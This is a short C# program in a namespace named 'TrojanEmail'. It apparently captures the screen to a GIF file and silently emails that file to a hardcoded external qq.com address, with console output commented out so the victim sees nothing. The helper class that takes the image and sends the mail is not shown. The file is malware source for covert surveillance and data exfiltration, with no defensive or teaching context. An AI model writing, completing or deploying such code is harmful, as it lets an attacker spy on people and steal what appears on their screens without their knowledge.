using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Mail;

namespace TrojanEmail
{
    class Program
    {
        static void Main(string[] args)
        {
            string filepath = "D:\\Capture.gif";
            string mailto = "1309297963@qq.com";
            string mailsubject = "Test";
            string mailbody = DateTime.Now.ToString();
            if (DenlonSend.SaveImage())
            {
                if (DenlonSend.SendEmail(mailto, mailsubject, mailbody, filepath))
                {
                    //Console.WriteLine("OK");
                }
            }
            //Console.ReadKey();
        }
    }
}
